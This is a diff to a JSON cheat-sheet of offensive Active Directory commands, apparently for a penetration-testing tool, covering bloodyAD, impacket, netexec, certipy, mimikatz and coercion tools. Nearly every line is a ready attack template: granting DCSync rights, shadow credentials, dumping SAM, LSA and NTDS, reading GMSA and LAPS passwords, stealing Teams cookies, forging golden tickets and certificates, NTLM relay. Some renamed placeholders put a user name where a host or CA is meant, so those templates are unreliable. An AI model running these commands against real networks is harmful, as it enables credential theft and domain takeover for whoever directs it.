@@ -13,53 +13,68 @@
     ]
   },
 {
+  "tool": "snmpwalk",
+  "tags": ["snmp", "enumeration", "network", "recon"],
+  "commands": [
+    {
+      "desc": "SNMP Walk (community string, save output)",
+      "cmd": "snmpwalk -v 2c -c public {{IP}} | tee snmp_data"
+    }
+  ]
+},
+{
   "tool": "bloodyAD",
   "tags": ["AD", "LDAP", "ACL", "privesc", "RBCD", "shadow-creds", "ADCS"],
   "commands": [
-    { "desc": "Add user to group", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add groupMember '{{GROUP}}' {{TARGET_USER}}" },
-    { "desc": "Add new user", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add user {{TARGET_USER}} '{{NEWPASS}}'" },
-    { "desc": "Add new computer", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add computer {{HOSTNAME}} '{{NEWPASS}}'" },
-    { "desc": "Add DCSync rights", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dcsync {{TARGET_USER}}" },
-    { "desc": "Grant GenericAll", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add genericAll {{TARGET}} {{TRUSTEE}}" },
-    { "desc": "Add RBCD", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add rbcd {{TARGET}} {{SERVICE}}" },
-    { "desc": "Add shadow credentials", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add shadowCredentials {{TARGET_USER}}" },
-    { "desc": "Add DNS record", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dnsRecord {{NAME}} {{IP}}" },
-    { "desc": "Add UAC flag", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add uac {{TARGET}} -f {{FLAG}}" },
-    { "desc": "Add badSuccessor DMSA", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add badSuccessor {{DMSA}}" },
-    { "desc": "Get object attributes", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}}" },
+    { "desc": "Get object info", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}}" },
     { "desc": "Get specific attribute", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}} --attr {{ATTR}}" },
     { "desc": "Get membership", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get membership {{TARGET}}" },
-    { "desc": "Get writable objects", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get writable" },
-    { "desc": "Get children", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get children --target '{{DN}}'" },
-    { "desc": "Get all users", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get children --otype user" },
-    { "desc": "Get all computers", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get children --otype computer" },
-    { "desc": "LDAP search", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get search --filter '{{FILTER}}'" },
-    { "desc": "DNS dump", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get dnsDump" },
-    { "desc": "Domain trusts", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get trusts" },
-    { "desc": "BloodHound collection", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get bloodhound" },
-    { "desc": "Set password", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set password {{TARGET}} '{{NEWPASS}}'" },
-    { "desc": "Remove user from group", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove groupMember '{{GROUP}}' {{TARGET_USER}}" },
+
+    { "desc": "Add user to group", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add groupMember {{GROUP}} {{TARGET_USER}}" },
+    { "desc": "Remove user from group", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove groupMember {{GROUP}} {{TARGET_USER}}" },
+
+    { "desc": "Add new user", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add user {{TARGET_USER}} '{{NEWPASS}}'" },
+    { "desc": "Add new computer", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add computer {{HOSTNAME}} '{{NEWPASS}}'" },
+
+    { "desc": "Set user password", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set password {{TARGET_USER}} '{{NEWPASS}}'" },
+
+    { "desc": "Grant GenericAll", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add genericAll {{TARGET}} {{TRUSTEE}}" },
+    { "desc": "Set owner (WriteOwner)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set owner {{TARGET}} {{NEW_OWNER}}" },
+
+    { "desc": "Add DCSync rights", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dcsync {{TARGET_USER}}" },
+
+    { "desc": "Add RBCD", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add rbcd {{DELEGATE_TO}} {{DELEGATE_FROM}}" },
+
+    { "desc": "Add shadow credentials", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add shadowCredentials {{TARGET_USER}}" },
     { "desc": "Remove shadow credentials", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove shadowCredentials {{TARGET_USER}}" },
-    { "desc": "Kerberos auth (ccache)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -k ccache={{CCACHE}} get object {{TARGET}}" },
-    { "desc": "Pass-the-Hash", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p '{{LMHASH}}:{{NTHASH}}' get object {{TARGET}}" },
-    { "desc": "Certificate auth", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -c '{{KEY}}:{{CERT}}' get object {{TARGET}}" },
-    { "desc": "MSLDAP whoami", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap whoami" },
-    { "desc": "Dump all domain objects", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dump" },
-    { "desc": "List Domain Admins", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap dadms" },
-    { "desc": "List Kerberoastable users", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap spns" },
-    { "desc": "AS-REP roastable users", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap asrep" },
-    { "desc": "List constrained delegation", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap constrained" },
-    { "desc": "List unconstrained delegation", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap unconstrained" },
-    { "desc": "Get LAPS passwords", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap laps" },
-    { "desc": "List GMSA accounts", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap gmsa" },
-    { "desc": "Add user (msldap)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap adduser {{DN}} '{{PASSWD}}'" },
-    { "desc": "Add user to group (msldap)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap addusertogroup {{USER_DN}} {{GROUP_DN}}" },
-    { "desc": "Change user password (msldap)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap changeuserpw {{USER_DN}} '{{NEWPASS}}'" },
-    { "desc": "Add SPN", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap addspn {{USER_DN}} {{SPN}}" },
-    { "desc": "Delete user", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap deluser {{USER_DN}}" },
-    { "desc": "Enable user", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap enableuser {{USER_DN}}" },
-    { "desc": "Disable user", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap disableuser {{USER_DN}}" },
-    { "desc": "LDAP query", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} msldap query '{{LDAP_QUERY}}'" }
+
+    { "desc": "Set SPN (WriteSPN)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' set object {{TARGET_USER}} servicePrincipalName -v '{{SPN}}'" },
+
+    { "desc": "Modify UPN", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set object {{TARGET}} userPrincipalName -v {{NEW_UPN}}" },
+    { "desc": "Check UPN", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET}} --attr userPrincipalName" },
+
+    { "desc": "Modify mail attribute", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set object {{TARGET}} mail -v {{MAIL}}" },
+
+    { "desc": "Modify altSecurityIdentities (ESC14B)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set object {{TARGET}} altSecurityIdentities -v '{{ALTSECID}}'" },
+
+    { "desc": "Enable disabled account", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} remove uac {{TARGET_USER}} -f ACCOUNTDISABLE" },
+    { "desc": "Add delegation flag", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add uac {{TARGET_USER}} -f TRUSTED_TO_AUTH_FOR_DELEGATION" },
+
+    { "desc": "Get writable objects", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get writable" },
+    { "desc": "Get writable (detailed)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get writable --detail" },
+    { "desc": "Get deleted objects (tombstoned)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get writable --include-del" },
+
+    { "desc": "LDAP search", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get search --filter '{{FILTER}}'" },
+    { "desc": "Extended LDAP search (tombstoned)", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065" },
+
+    { "desc": "Restore deleted object", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} -k set restore {{TARGET_USER}}" },
+
+    { "desc": "Get MachineAccountQuota", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object '{{BASE_DN}}' --attr ms-DS-MachineAccountQuota" },
+    { "desc": "Set MachineAccountQuota", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} set object '{{BASE_DN}}' ms-DS-MachineAccountQuota -v {{VALUE}}" },
+
+    { "desc": "Read GMSA password", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} get object {{TARGET_USER}} --attr msDS-ManagedPassword" },
+
+    { "desc": "Add DNS record", "cmd": "bloodyAD --host {{IP}} -d {{DOMAIN}} -u {{USER}} -p {{PASS}} add dnsRecord {{NAME}} {{IP_ADDR}}" }
   ]
 },
   {
@@ -78,11 +93,11 @@
       { "desc": "NTLMRelayx (relay)", "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -i" },
       { "desc": "NTLMRelayx to ADCS", "cmd": "impacket-ntlmrelayx -t http://{{IP}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" },
       { "desc": "Lookupsid (RID brute)", "cmd": "impacket-lookupsid {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}" },
-      { "desc": "AddComputer", "cmd": "impacket-addcomputer {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{IP}} -computer-name 'FAKE$' -computer-pass 'FakePass123!'" },
+      { "desc": "AddComputer", "cmd": "impacket-addcomputer {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{IP}} -computer-name 'FAKE$' -computer-pass {{NEWPASS}}" },
       { "desc": "GetADUsers", "cmd": "impacket-GetADUsers -all {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{IP}}" },
       { "desc": "DComExec", "cmd": "impacket-dcomexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}" },
       { "desc": "AtExec", "cmd": "impacket-atexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}} 'whoami'" },
-      { "desc": "MSSQL Client (password auth)", "cmd": "impacket-mssqlclient {{USER}}:'{{PASS}}'@{{TARGET}}"}
+      { "desc": "MSSQL Client (password auth)", "cmd": "impacket-mssqlclient {{USER}}:'{{PASS}}'@{{TARGET_USER}}"}
     ]
   },
   {
@@ -94,7 +109,7 @@
       { "desc": "Generate krb5.conf file", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --generate-krb5-file Generated_krb5.conf" },
       { "desc": "SMB Password Spray", "cmd": "netexec smb {{IP}} -u users.txt -p {{PASS}} --continue-on-success" },
       { "desc": "SMB List Shares", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --shares" },
-      { "desc": "Spider share", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M spider_plus --share '{{TARGET}}'" },
+      { "desc": "Spider share", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M spider_plus --share '{{TARGET_USER}}'" },
       { "desc": "Dump SAM", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --sam" },
       { "desc": "Dump LSA", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --lsa" },
       { "desc": "Dump NTDS", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --ntds" },
@@ -121,10 +136,10 @@
       { "desc": "Find Misconfigured Delegation", "cmd": "netexec ldap {{IP}} -u {{USER}} -p {{PASS}} --find-delegation" },
       { "desc": "Unconstrained Delegation", "cmd": "netexec ldap {{IP}} -u {{USER}} -p {{PASS}} --trusted-for-delegation" },
       { "desc": "Dump User Local Security Questions", "cmd": "netexec ldap {{IP}} -u {{USER}} -p {{PASS}} -M security-questions" },
-      { "desc": "Change User Password: Change Password of the Current User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M change-password -o NEWPASS='Password@123!'" },
+      { "desc": "Change User Password: Change Password of the Current User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M change-password -o NEWPASS={{NEWPASS}}" },
       { "desc": "Change User Password: Change Hash of the Current User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}}  -M change-password -o NEWNTHASH=31d6cfe0d16ae931b73c59d7e0c089c0" },
-      { "desc": "Change Password of a different User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M change-password -o USER={{TARGET}} NEWPASS='Password@123!'" },
-      { "desc": "Change Hash of a different User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M change-password -o USER={{TARGET}} NEWHASH=10C035D527CA60BE3ADF51996E7CD7E1" },
+      { "desc": "Change Password of a different User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M change-password -o USER={{TARGET_USER}} NEWPASS={{NEWPASS}}" },
+      { "desc": "Change Hash of a different User", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} -M change-password -o USER={{TARGET_USER}} NEWHASH=10C035D527CA60BE3ADF51996E7CD7E1" },
       { "desc": "Steal Microsoft Teams Cookies", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}}  -M teams_localdb" },
       { "desc": "Checking for Spooler & WebDav", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}}  -M webdav/spooler" },
       { "desc": "Defeating LAPS", "cmd": "netexec smb {{IP}} -u {{USER}} -p {{PASS}} --laps" },
@@ -159,12 +174,12 @@
     "tags": ["ADCS", "certificates", "ESC", "privesc", "AD"],
     "commands": [
       { "desc": "Find vulnerable templates", "cmd": "certipy find -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}} -vulnerable -stdout" },
-      { "desc": "ESC1 – Request cert as DA", "cmd": "certipy req -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}} -target {{TARGET}} -ca '{{TARGET}}-CA' -template 'VulnTemplate' -upn administrator@{{DOMAIN}}" },
+      { "desc": "ESC1 – Request cert as DA", "cmd": "certipy req -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}} -target {{TARGET_USER}} -ca '{{TARGET_USER}} -CA' -template 'VulnTemplate' -upn administrator@{{DOMAIN}}" },
       { "desc": "Auth with cert (get NTLM hash)", "cmd": "certipy auth -pfx administrator.pfx -dc-ip {{IP}}" },
       { "desc": "ESC4 – Modify template", "cmd": "certipy template -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}} -template 'VulnTemplate' -save-old" },
-      { "desc": "ESC8 – NTLM relay to ADCS", "cmd": "certipy relay -ca {{TARGET}} -template DomainController" },
+      { "desc": "ESC8 – NTLM relay to ADCS", "cmd": "certipy relay -ca {{TARGET_USER}} -template DomainController" },
       { "desc": "Shadow credentials (RBCD/ESC)", "cmd": "certipy shadow auto -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}} -account {{TARGET_USER}}" },
-      { "desc": "Dump CA private key", "cmd": "certipy ca -backup -ca '{{TARGET}}-CA' -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}}" },
+      { "desc": "Dump CA private key", "cmd": "certipy ca -backup -ca '{{TARGET_USER}}-CA' -u {{USER}}@{{DOMAIN}} -p {{PASS}} -dc-ip {{IP}}" },
       { "desc": "Forge golden cert", "cmd": "certipy forge -ca-pfx ca.pfx -upn administrator@{{DOMAIN}} -subject 'CN=Administrator,CN=Users,DC={{DOMAIN}},DC=local'" }
     ]
   },
@@ -229,7 +244,7 @@
       { "desc": "DCSync (single user)", "cmd": "lsadump::dcsync /domain:{{DOMAIN}} /user:{{TARGET_USER}}" },
       { "desc": "Pass-the-Hash", "cmd": "sekurlsa::pth /user:{{USER}} /domain:{{DOMAIN}} /ntlm:{{HASH}} /run:cmd.exe" },
       { "desc": "Golden ticket", "cmd": "kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:S-1-5-21-XXXXXXXXXX /krbtgt:{{HASH}} /ptt" },
-      { "desc": "Silver ticket", "cmd": "kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:S-1-5-21-XXXXXXXXXX /target:{{TARGET}}.{{DOMAIN}} /service:cifs /rc4:{{HASH}} /ptt" },
+      { "desc": "Silver ticket", "cmd": "kerberos::golden /user:Administrator /domain:{{DOMAIN}} /sid:S-1-5-21-XXXXXXXXXX /target:{{TARGET_USER}}.{{DOMAIN}} /service:cifs /rc4:{{HASH}} /ptt" },
       { "desc": "Export tickets", "cmd": "kerberos::list /export" },
       { "desc": "Dump DPAPI creds", "cmd": "dpapi::cred /in:%appdata%\\Microsoft\\Credentials\\XXXXXXXX /unprotect" }
     ]
@@ -267,16 +282,16 @@
     "tool": "petitpotam",
     "tags": ["coerce", "relay", "NTLM", "AD", "DC", "ESC8"],
     "commands": [
-      { "desc": "Coerce DC (unauthenticated)", "cmd": "python3 PetitPotam.py {{IP}} {{TARGET}}" },
-      { "desc": "Coerce DC (authenticated)", "cmd": "python3 PetitPotam.py -u {{USER}} -p {{PASS}} -d {{DOMAIN}} {{IP}} {{TARGET}}" }
+      { "desc": "Coerce DC (unauthenticated)", "cmd": "python3 PetitPotam.py {{IP}} {{TARGET_USER}}" },
+      { "desc": "Coerce DC (authenticated)", "cmd": "python3 PetitPotam.py -u {{USER}} -p {{PASS}} -d {{DOMAIN}} {{IP}} {{TARGET_USER}}" }
     ]
   },
   {
     "tool": "printerbug",
     "tags": ["coerce", "relay", "NTLM", "spoolss", "AD"],
     "commands": [
-      { "desc": "Trigger spooler auth", "cmd": "python3 printerbug.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}} {{IP}}" },
-      { "desc": "Check spooler is running", "cmd": "impacket-rpcdump @{{TARGET}} | grep -i 'spoolss\\|MS-RPRN'" }
+      { "desc": "Trigger spooler auth", "cmd": "python3 printerbug.py {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET_USER}} {{IP}}" },
+      { "desc": "Check spooler is running", "cmd": "impacket-rpcdump @{{TARGET_USER}} | grep -i 'spoolss\\|MS-RPRN'" }
     ]
   },
   {
